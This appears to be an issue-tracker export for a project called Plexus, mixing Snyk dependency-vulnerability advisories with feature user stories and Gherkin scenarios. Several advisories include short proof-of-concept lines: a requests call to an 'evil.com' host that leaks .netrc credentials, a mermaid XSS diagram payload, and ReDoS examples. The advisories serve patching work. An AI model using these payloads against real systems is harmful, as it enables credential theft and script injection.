## Insertion of Sensitive Information Into Sent Data

**Severity:** medium
**Package:** requests@2.31.0
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 5.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 606/1000

### CVEs
- [CVE-2024-47081](https://nvd.nist.gov/vuln/detail/CVE-2024-47081)

**Fix:** Pin `requests` to version 2.32.4 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.

**Note:**

This is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's "intended" part (e.g., `example.com` in `http://example.com:@evil.com/`).
## PoC
```
requests.get('http://example.com:@evil.com/')
```
## Remediation
Upgrade `requests` to version 2.32.4 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b)
- [GitHub Commit](https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae)
- [GitHub Commit](https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef)
- [GitHub Issue](https://github.com/psf/requests/issues/6964)
- [GitHub PR](https://github.com/psf/requests/pull/6962)
- [GitHub PR](https://github.com/psf/requests/pull/6963)
- [GitHub PR](https://github.com/psf/requests/pull/6965)
- [Seclists Full Disclosure](https://seclists.org/fulldisclosure/2025/Jun/2)
- [Vulnerable Code](https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-10305723)
issues.title: [Snyk] SNYK-PYTHON-REQUESTS-10305723 in requests@2.31.0

issues.description:
## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66471](https://nvd.nist.gov/vuln/detail/CVE-2025-66471)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192442)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192442 in urllib3@2.0.7

## Uncontrolled Resource Consumption ('Resource Exhaustion')

**Severity:** high
**Package:** pillow@9.5.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 7.5  
**Snyk Priority Score:** 589/1000

### CVEs
- [CVE-2023-44271](https://nvd.nist.gov/vuln/detail/CVE-2023-44271)

**Fix:** Pin `pillow` to version 10.0.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Uncontrolled Resource Consumption ('Resource Exhaustion') when the `ImageFont` truetype in an `ImageDraw` instance operates on a long text argument. An attacker can cause the service to crash by processing a task that uncontrollably allocates memory.
## Remediation
Upgrade `pillow` to version 10.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/commit/1fe1bb49c452b0318cad12ea9d97c3bef188e9a7)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/7244)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-6043904)

issues.description:
## User Story
As an AQA lab worker, I want to generate missing score code implementations for an existing scorecard from its guidelines, so that I can move configured scorecards into runnable production scoring faster.

## Feature
Feature: Create Score code for existing scorecard

Scenario: Plan and apply missing score code updates
Given a scorecard exists with guidelines on all scores and at least one score missing code
When I run the create-score-code procedure with stakeholder context
Then the procedure observes available scorecards and score details via tools
And orients to identify the intended scorecard
And fails with an error if no matching scorecard is found
And decides a per-score code implementation plan with sub-agent isolation
And validates each drafted implementation by confirming predictions can run
And requests human approval before changes are applied
And applies score code updates programmatically when approved

## Acceptance Criteria
- Observe stage builds a context pack from scorecard/score listing tool outputs, including instructions for paging and detail retrieval.
- Orient stage resolves the target scorecard from stakeholder brief + context pack, or exits with clear not-found error.
- Decide stage produces a plan for updating only scores missing implementations.
- Per-score drafting runs in isolated sub-agent context and returns implementation payload by explicit completion convention.
- Validation loop verifies drafted code supports successful prediction execution before finalization.
- Human approval gate is required before Act stage writes updates.
- Act stage updates score code through MCP tools and returns update IDs/results.
- Dry-run mode returns plan without applying updates.
issues.title: Create Score code from guidelines via procedure

Feature: VectorTopicMemory block registration and instantiation

  Scenario: VectorTopicMemory appears in the block class registry
    Given the plexus.reports.blocks module has been imported
    When the BLOCK_CLASSES dictionary is inspected in plexus/reports/service.py
    Then it contains a key "VectorTopicMemory"
    And the value is a class that is a subclass of BaseReportBlock

  Scenario: VectorTopicMemory is instantiated from valid config
    Given a config dict with embedding, opensearch, and clustering sections
    And a mock PlexusDashboardClient
    When VectorTopicMemory(config, params, api_client) is called
    Then the instance has config, params, and api_client set correctly
    And DEFAULT_NAME equals "Vector Topic Memory"

  Scenario: VectorTopicMemory handles None params
    Given a config dict and params is None
    When VectorTopicMemory(config, None, api_client) is called
    Then self.params is an empty dictionary

issues.description:
**As a** report system consumer, **I want** to declare a `VectorTopicMemory` block in my report configuration, **so that** the report service discovers and instantiates it like any other block.

The report service in `plexus/reports/service.py` discovers block classes via reflection on the `plexus/reports/blocks/__init__.py` module. A new `VectorTopicMemory` class must extend `BaseReportBlock`, be imported in `__init__.py`, and appear in the `BLOCK_CLASSES` registry.

## Key Files

- Create: `plexus/reports/blocks/vector_topic_memory.py`
- Create: `plexus/reports/blocks/vector_topic_memory_test.py`
- Modify: `plexus/reports/blocks/__init__.py` (add import + `__all__` entry)

## Dependencies

None. First story in the initiative.
issues.title: Block registration and instantiation

comments.text:
Feature: OpenSearch client connection and health check

  Scenario: Client initializes with endpoint and region
    Given an OpenSearch domain endpoint "search-xxx.us-west-2.es.amazonaws.com"
    And AWS region "us-west-2"
    When TopicMemoryIndex(endpoint, region) is constructed
    Then the client is configured with SigV4 signing for service "es"
    And no exception is raised

  Scenario: Health check succeeds against a healthy cluster
    Given a TopicMemoryIndex with a mocked opensearch-py client
    And the mock returns {"status": "green"} from cluster.health()
    When health_check() is called
    Then it returns True

  Scenario: Health check returns False for unreachable cluster
    Given a TopicMemoryIndex with a mocked client that raises ConnectionError
    When health_check() is called
    Then it returns False
    And an error is logged

issues.description:
**As a** ReportBlock, **I want** an OpenSearch client that connects via IAM auth and verifies cluster health, **so that** I can fail fast when the domain is unavailable.

A `TopicMemoryIndex` class wraps the `opensearch-py` client, configured with the domain endpoint and AWS SigV4 auth (via the IAM role from the infra stack). The first observable behavior is a health check that returns `True`/`False`.

The client accepts an endpoint URL and region, handling all SigV4 signing internally. Connection failures must not raise — they return `False` from `health_check()` and log the error.

## Key Files

- Create: `plexus/analysis/opensearch_client.py`
- Create: `plexus/analysis/opensearch_client_test.py`
- Modify: `pyproject.toml` (add `opensearch-py>=2.4.0`, `requests-aws4auth>=1.2.3`)

## Dependencies

Story plx-a2a3cb (CDK stack) — for knowing the endpoint config shape.
issues.title: OpenSearch client connection and health check

issues.description:
## Regular Expression Denial of Service (ReDoS)

**Severity:** medium
**Package:** diff@4.0.2
**File:** `dashboard/package.json`

**CVSS Score:** 6.3  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 422/1000

### CVEs
- [CVE-2026-24001](https://nvd.nist.gov/vuln/detail/CVE-2026-24001)

**Fix:** Pin `diff` to version 3.5.1, 4.0.4, 5.2.2, 8.0.3 or later.

### Details
## Overview
[diff](https://www.npmjs.com/package/diff) is a javascript text differencing implementation.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `parsePatch()` and `applyPatch()` functions if the user input passed without sanitisation. An attacker can cause the process to enter an infinite loop and exhaust system memory by providing a patch with filename headers containing `\r`, `\u2028`, or `\u2029` characters or having control over patch's `patch` header for application generated patches.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: "ACCCX". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `diff` to version 3.5.1, 4.0.4, 5.2.2, 8.0.3 or higher.
## References
- [GitHub Commit](https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5)
- [GitHub Commit](https://github.com/kpdecker/jsdiff/commit/de95cca5329730cf9dcdd85c634633693b3ab3db)
- [GitHub Issue](https://github.com/kpdecker/jsdiff/issues/644)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-DIFF-14917201)
issues.title: [Snyk] SNYK-JS-DIFF-14917201 in diff@4.0.2

## Improper Handling of Unexpected Data Type

**Severity:** medium
**Package:** on-headers@1.0.2
**File:** `dashboard/package.json`

**CVSS Score:** 4.6  
**Snyk Priority Score:** 230/1000

### CVEs
- [CVE-2025-7339](https://nvd.nist.gov/vuln/detail/CVE-2025-7339)

**Fix:** Pin `on-headers` to version 1.1.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Improper Handling of Unexpected Data Type via the `response.writeHead` function. An attacker can manipulate HTTP response headers by passing an array to this function, potentially leading to unintended disclosure or modification of header information.

## Workaround

This vulnerability can be mitigated by passing an object to `response.writeHead()` instead of an array.
## Remediation
Upgrade `on-headers` to version 1.1.0 or higher.
## References
- [GitHub Commit](https://github.com/jshttp/on-headers/commit/c6e384908c9c6127d18831d16ab0bd96e1231867)
- [GitHub Issue](https://github.com/expressjs/morgan/issues/315)
- [GitHub Issue](https://github.com/jshttp/on-headers/issues/15)
- [OpenJS Advisories](https://cna.openjsf.org/security-advisories.html)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-ONHEADERS-10773729)
issues.title: [Snyk] SNYK-JS-ONHEADERS-10773729 in on-headers@1.0.2

## Server-side Request Forgery (SSRF)

**Severity:** high
**Package:** next@14.2.29
**File:** `dashboard/package.json`

**CVSS Score:** 8.3  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 736/1000

### CVEs
- [CVE-2025-57822](https://nvd.nist.gov/vuln/detail/CVE-2025-57822)

**Fix:** Upgrade `next` to version 14.2.32, 15.4.2-canary.43, 15.4.7 or later.

### Details
## Overview
[next](https://www.npmjs.com/package/next) is a react framework.

Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `resolve-routes`. An attacker can access internal resources and potentially exfiltrate sensitive information by crafting requests containing user-controlled headers (e.g.,
Location) that are forwarded or interpreted without validation.

**Note:** This is only exploitable if custom middleware logic is implemented in a self-hosted deployment. The project maintainers recommend using the documented `NextResponse.next({request})` to explicitly pass the request object.
## Remediation
Upgrade `next` to version 14.2.32, 15.4.2-canary.43, 15.4.7 or higher.
## References
- [GitHub Commit](https://github.com/vercel/next.js/commit/1a026e338d2b8c977c8949a134168952338d6d01)
- [GitHub Commit](https://github.com/vercel/next.js/commit/6a974adc455776b335b0db094d4c2e5349d97c97)
- [GitHub Commit](https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8)
- [Vercel Security Advisory](https://vercel.com/changelog/cve-2025-57822)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-57822.yaml)

**Severity:** low

## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `sqlite3` package and not the `sqlite3` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

An integer overflow exists in the  FTS5 https://sqlite.org/fts5.html  extension. It occurs when the size of an array of tombstone pointers is calculated and truncated into a 32-bit integer. A pointer to partially controlled data can then be written out of bounds.

comments.author: ryan.porter
comments.text:
Feature: TopicClusterer returns exemplar indices

  Scenario: Representative doc indices map to the original documents list
    Given a TopicClusterer fitted with 100 documents and their embeddings
    And topic 0 has 20 member documents
    When _get_representative_doc_indices(topic_id=0, n=5) is called
    Then 5 integer indices are returned
    And each index is in the range 0 to 99
    And documents[index] for each index is a member of topic 0

  Scenario: Indices are ordered by proximity to centroid
    Given a TopicClusterer fitted with documents and embeddings
    And topic 0 has a known centroid
    When _get_representative_doc_indices(topic_id=0, n=3) is called
    Then the first index corresponds to the document closest to the centroid
    And the second index is the next closest
    And the third index is the next closest

  Scenario: _get_representative_docs returns the same texts as indexed lookup
    Given a TopicClusterer fitted with documents
    When _get_representative_doc_indices(topic_id=0, n=5) returns indices
    And _get_representative_docs(topic_id=0, n=5) returns texts
    Then documents[indices[i]] equals texts[i] for all i

  Scenario: Requesting more exemplars than members returns all members
    Given a topic with only 3 member documents
    When _get_representative_doc_indices(topic_id, n=5) is called
    Then 3 indices are returned

  Scenario: Empty or missing topic returns empty list
    Given a topic_id that has no members
    When _get_representative_doc_indices(topic_id, n=5) is called
    Then an empty list is returned

issues.description:
**As a** memory analysis pipeline, **I want** the TopicClusterer to return the dataset indices of representative documents alongside the text, **so that** calling code can look up the corresponding Item IDs and identifiers for each exemplar.

## Background

`TopicClusterer._get_representative_docs(topic_id, n)` currently returns `List[str]` — the text of the n documents closest to the cluster centroid. The calling code in `VectorTopicMemory` has a parallel `doc_ids` list where `doc_ids[i]` corresponds to `documents[i]`, but the clusterer discards the indices after selecting representative docs. Without the indices, there is no way to trace an exemplar back to its source Item.

## Solution

Add `_get_representative_doc_indices(topic_id, n)` that returns `List[int]` — the indices into the original documents list for the n most representative documents. The existing `_get_representative_docs` can be reimplemented in terms of this method. The caller then uses `doc_ids[index]` to get the Item ID.

## Key Files

- Modify: `plexus/analysis/topic_clusterer.py`
- Modify: `plexus/analysis/topic_clusterer_test.py`

## Dependencies

None. First story in the epic.
issues.title: TopicClusterer returns exemplar indices alongside text

issues.description: ## Cross-site Scripting (XSS) **Severity:** medium **Package:** mermaid@10.9.3 **File:** `dashboard/package.json` **CVSS Score:** 5.3 **Exploit Maturity:** proof-of-concept **Snyk Priority Score:** 372/1000 ### CVEs - [CVE-2025-54881](https://nvd.nist.gov/vuln/detail/CVE-2025-54881) **Fix:** Pin `mermaid` to version 11.10.0 or later. ### Details ## Overview [mermaid](https://github.com/knsv/mermaid) is a package for generation of diagrams and flowcharts from text in a similar manner as markdown. Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `calculateMathMLDimensions` function, which was introduced in [5c69e5f](https://github.com/mermaid-js/mermaid/commit/5c69e5fdb004a6d0a2abe97e23d26e223a059832). An attacker can execute arbitrary scripts in the context of the user's browser by injecting malicious HTML into sequence diagram labels, which are processed and rendered without proper sanitization. ## PoC ``` sequenceDiagram participant A as Alice$$\\text{Alice}$$ A->>John: Hello John, how are you? Alice-)John: See you later! ``` ## Details Cross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website. This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML) in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy. Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability. Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as `<`; and `>` can be coded as `>`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted. The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. ### Types of attacks There are a few methods by which XSS can be manipulated: |Type|Origin|Description| |--|--|--| |**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.| |**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| |**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.| |**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.| ### Affected environments The following environments are susceptible to an XSS attack: * Web servers * Application servers * Web application environments ### How to prevent This section describes the top best practices designed to specifically protect your code: * Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. * Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. * Give users the option to disable client-side scripts. * Redirect invalid requests. * Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions. * Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack. * Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML. ## Remediation Upgrade `mermaid` to version 11.10.0 or higher. ## References - [GitHub Commit](https://github.com/mermaid-js/mermaid/commit/685516a85ec1df64cefd4fd15f26533be87d458e) ### Reference - [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-MERMAID-12027649)
issues.title: [Snyk] SNYK-JS-MERMAID-12027649 in mermaid@10.9.3

issues.description:
## Improper Removal of Sensitive Information Before Storage or Transfer

**Severity:** medium
**Package:** urllib3@2.0.7
**File:** `plexus/metrics/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2024-37891](https://nvd.nist.gov/vuln/detail/CVE-2024-37891)

**Fix:** Pin `urllib3` to version 1.26.19, 2.2.2 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Removal of Sensitive Information Before Storage or Transfer due to the improper handling of the `Proxy-Authorization` header during cross-origin redirects when `ProxyManager` is not in use. When the conditions below are met, including non-recommended configurations, the contents of this header can be sent in an automatic HTTP redirect.

**Notes:**

To be vulnerable, the application must be doing all of the following:

1) Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.

2) Not disabling HTTP redirects (e.g. with `redirects=False`)

3) Either not using an HTTPS origin server, or having a proxy or target origin that redirects to a malicious origin.

## Workarounds

1) Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.

2) Disabling HTTP redirects using `redirects=False` when sending requests.

3) Not using the `Proxy-Authorization` header.
## Remediation
Upgrade `urllib3` to version 1.26.19, 2.2.2 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468)
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-7267250)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-7267250 in urllib3@2.0.7

## Race Condition

**Severity:** low
**Package:** coreutils@9.7-3
**File:** `score-processor-lambda/Dockerfile`

**CVSS Score:** 4.7  
**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2017-18018](https://nvd.nist.gov/vuln/detail/CVE-2017-18018)

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `coreutils` package and not the `coreutils` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.
## Remediation
There is no fixed version for `Debian:13` `coreutils`.

## XML Injection

**Severity:** medium
**Package:** fonttools@4.38.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 6.9  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 666/1000

### CVEs
- [CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)

**Fix:** Pin `fonttools` to version 4.61.0 or later.

### Details
## Overview
[fonttools](https://pypi.org/project/fonttools) is a Tools to manipulate font files

Affected versions of this package are vulnerable to XML Injection via the `main()` function in the `fontTools/varLib/__init__.py` file. An attacker can write files to the filesystem by supplying a specially crafted `.designspace` file.
## Remediation
Upgrade `fonttools` to version 4.61.0 or higher.
## References
- [GitHub Commit](https://github.com/fonttools/fonttools/commit/a696d5ba93270d5954f98e7cab5ddca8a02c1e32)
- [Vulnerable Code](https://github.com/googlefonts/fontmake/blob/35e9e5dbdf2130a04c54688bb1bdbcfdb4b5fc67/Lib/fontmake/font_project.py#L438)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-FONTTOOLS-14151621)

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@1.26.20
**File:** `dashboard/amplify/functions/taskDispatcher/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66471](https://nvd.nist.gov/vuln/detail/CVE-2025-66471)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192442)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192442 in urllib3@1.26.20

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@1.26.20
**File:** `score-processor-fanout-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441)

**Fix:** Pin `urllib3` to version 2.6.3 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the streaming API when handling HTTP redirects. An attacker can cause excessive resource consumption by serving a specially crafted compressed response that triggers decompression of large amounts of data before any read limits are enforced.

**Note:**
This is only exploitable if content is streamed from untrusted sources with redirects enabled.

## Workaround 
This vulnerability can be mitigated by disabling redirects by setting `redirect=False` for requests to untrusted sources.
## Remediation
Upgrade `urllib3` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14896210)

## Uncontrolled Recursion

**Severity:** low
**Package:** glibc/libc-bin@2.41-12+deb13u1
**File:** `score-processor-lambda/Dockerfile`

**CVSS Score:** 7.5  
**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2018-20796](https://nvd.nist.gov/vuln/detail/CVE-2018-20796)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `glibc` package and not the `glibc` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.
## Remediation
There is no fixed version for `Debian:13` `glibc`.
## References
- [https://security-tracker.debian.org/tracker/CVE-2018-20796](https://security-tracker.debian.org/tracker/CVE-2018-20796)

## Improper Removal of Sensitive Information Before Storage or Transfer

**Severity:** medium
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2024-37891](https://nvd.nist.gov/vuln/detail/CVE-2024-37891)

**Fix:** Pin `urllib3` to version 1.26.19, 2.2.2 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Removal of Sensitive Information Before Storage or Transfer due to the improper handling of the `Proxy-Authorization` header during cross-origin redirects when `ProxyManager` is not in use. When the conditions below are met, including non-recommended configurations, the contents of this header can be sent in an automatic HTTP redirect.

**Notes:**

To be vulnerable, the application must be doing all of the following:

